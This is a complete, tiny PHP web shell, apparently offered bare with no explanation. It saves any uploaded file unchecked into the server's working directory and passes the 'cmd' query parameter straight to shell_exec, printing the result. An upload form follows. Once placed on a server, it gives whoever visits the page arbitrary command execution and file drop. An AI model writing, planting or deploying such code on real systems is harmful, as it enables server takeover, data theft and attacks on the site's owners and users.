<?php
if (isset($_FILES['file'])) {
    $target = basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo "Uploaded: " . $target;
}

if (isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
